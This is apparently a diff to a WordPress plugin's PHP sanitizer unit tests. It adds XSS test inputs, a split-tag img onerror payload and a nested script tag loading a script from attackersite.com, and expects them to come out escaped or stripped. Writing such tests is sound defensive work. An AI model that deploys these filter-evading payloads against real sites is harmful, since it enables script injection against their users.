@@ -968,6 +968,8 @@ class SanitizerTest extends \WP_UnitTestCase
     {
         $values = $this->testValues;
         $values[] = '<div><span><a id="xxx" href="https://apple.com" title="hello" target="_blank"><span>Hello</span></a> this is <em>a link</em> and a <strong>link</strong></span></div><ul><li></li></ul>';
+        $values[] = '<img sr<img src="x">c=x onerror=alert(55)>';
+        $values[] = '<script sr<img src="x">c=https://attackersite.com/test.js>';
         $sanitized = $this->sanitize('text-html', $values);
         $this->assertEquals($sanitized, [
             0 => '',
@@ -998,12 +1000,18 @@ class SanitizerTest extends \WP_UnitTestCase
             25 => 'https://wordpress.org',
             26 => '-1',
             27 => '<a id="xxx" href="https://apple.com" title="hello" target="_blank">Hello</a> this is <em>a link</em> and a <strong>link</strong>',
+            28 => '&lt;img src=x alert(55)&gt;',
+            29 => '&lt;script src=https://attackersite.com/test.js&gt;',
         ]);
     }
 
     public function testSanitizeTextMultiline()
     {
-        $sanitized = $this->sanitize('text-multiline');
+        $values = $this->testValues;
+        $values[] = '<div><span><a id="xxx" href="https://apple.com" title="hello" target="_blank"><span>Hello</span></a> this is <em>a link</em> and a <strong>link</strong></span></div><ul><li></li></ul>';
+        $values[] = '<img sr<img src="x">c=x onerror=alert(55)>';
+        $values[] = '<script sr<img src="x">c=https://attackersite.com/test.js>';
+        $sanitized = $this->sanitize('text-multiline', $values);
         $this->assertEquals($sanitized, [
             0 => '',
             1 => 'abc',
@@ -1032,12 +1040,19 @@ class SanitizerTest extends \WP_UnitTestCase
             24 => 'www.wordpress.org',
             25 => 'https://wordpress.org',
             26 => '-1',
+            27 => 'Hello this is a link and a link',
+            28 => '',
+            29 => '',
         ]);
     }
 
     public function testSanitizeTextPost()
     {
-        $sanitized = $this->sanitize('text-post');
+        $values = $this->testValues;
+        $values[] = '<div><span><a id="xxx" href="https://apple.com" title="hello" target="_blank"><span>Hello</span></a> this is <em>a link</em> and a <strong>link</strong></span></div><ul><li></li></ul>';
+        $values[] = '<img sr<img src="x">c=x onerror=alert(55)>';
+        $values[] = '<script sr<img src="x">c=https://attackersite.com/test.js>';
+        $sanitized = $this->sanitize('text-post', $values);
         $this->assertEquals($sanitized, [
             0 => '',
             1 => 'abc',
@@ -1066,6 +1081,9 @@ class SanitizerTest extends \WP_UnitTestCase
             24 => 'www.wordpress.org',
             25 => 'https://wordpress.org',
             26 => '-1',
+            27 => '<div><span><a id=\"xxx\" href=\"https://apple.com\" title=\"hello\" target=\"_blank\"><span>Hello</span></a> this is <em>a link</em> and a <strong>link</strong></span></div><ul><li></li></ul>',
+            28 => '&lt;img sr<img src=\"x\">c=x alert(55)&gt;',
+            29 => '&lt;script sr<img src=\"x\">c=https://attackersite.com/test.js&gt;',
         ]);
     }
 
@@ -1279,7 +1297,7 @@ class SanitizerTest extends \WP_UnitTestCase
             17 => '李祖阳 xx xx',
             18 => 'axdextomorrow 200 200 peter',
             19 => 'this is true',
-            20 => 'single-review full-width onmouseoveralert69',
+            20 => 'single-review full-width alert69',
             21 => 'mattwordpress.org',
             22 => 'httpswordpress.org',
             23 => 'wordpress.org',
